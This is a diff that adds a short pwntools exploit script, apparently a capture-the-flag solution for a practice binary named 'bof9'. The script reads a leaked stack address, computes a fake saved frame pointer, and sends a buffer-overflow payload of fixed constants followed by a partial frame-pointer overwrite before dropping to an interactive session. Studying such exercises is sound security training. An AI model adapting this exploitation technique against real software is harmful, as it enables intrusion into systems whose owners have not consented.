@@ -1,0 +1,16 @@
+from pwn import *
+
+p = process("./bof9")
+
+p.recvuntil(b"user: ")
+stack_addr = int(p.recvline(), 16)
+user_addr = stack_addr - 0x10 - 0x20
+rbp_fake = user_addr + 0x20
+
+payload = p64(0x13371337) + p64(0xDEADBEEF) + p64(0xCAFEBABE) + p64(0) + p16(rbp_fake & 0xffff)
+p.sendafter(b"Username: ", payload)
+p.sendafter(b"Password: ", b'l')
+
+print(hex(stack_addr))
+
+p.interactive()
